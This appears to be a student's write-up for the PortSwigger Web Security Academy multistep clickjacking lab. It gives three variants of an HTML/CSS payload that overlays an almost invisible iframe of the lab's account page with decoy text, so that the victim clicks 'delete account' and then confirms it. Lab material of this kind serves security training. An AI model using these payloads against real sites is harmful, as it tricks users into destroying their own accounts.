# Lab: Multistep clickjacking
# https://portswigger.net/web-security/learning-paths/clickjacking/clickjacking-multistep-clickjacking/clickjacking/lab-multistep#

```bash
# Try to delete your account and you will see that you need to click on delete account and after that yes button.
```
```bash
<style>
	iframe {
		position:relative;
		width: 1000px;
		height:700px;
		z-index: 2;
		opacity: 0.0001;
	}
	
	.first, .second{
		position:absolute;
		top: 515px;
		left: 50px;
		z-index: 1;
	}
	.second{
		top: 310px;
		left: 200px;
	}
</style>

<div class="first"> Test me first</div>
<div class="second"> Test me next</div>

<iframe src="https://0a9800bd042be931800d7bd1008700f6.web-security-academy.net/my-account"></iframe>

# If it doesn't work try this(This is with the size that lab suggest):

<style>
	iframe {
		position:relative;
		width: 500px;
		height:700px;
		z-index: 2;
		opacity: 0.0001;
	}
	
	.first, .second{
		position:absolute;
		top: 330px;
		left: 50px;
		z-index: 1;
	}
	.second{
		top: 285px;
		left: 225px;
	}
</style>

<div class="first"> Test me first</div>
<div class="second"> Test me next</div>

<iframe src="https://0a9800bd042be931800d7bd1008700f6.web-security-academy.net/my-account"></iframe>

# You can also try this one:


<style>
	iframe {
		position:relative;
		width: 500px;
		height:700px;
		z-index: 2;
		opacity: 0.0001;
	}
	
	.first, .second{
		position:absolute;
		top: 500px;
		left: 50px;
		z-index: 1;
	}
	.second{
		top: 295px;
		left: 205px;
	}
</style>

<div class="first"> Test me first</div>
<div class="second"> Test me next</div>

<iframe src="https://0a9800bd042be931800d7bd1008700f6.web-security-academy.net/my-account"></iframe>

# The problem with this labs sometimes true payload doesn't work so you might need to multiple diffirent payloads diffirent times.
``
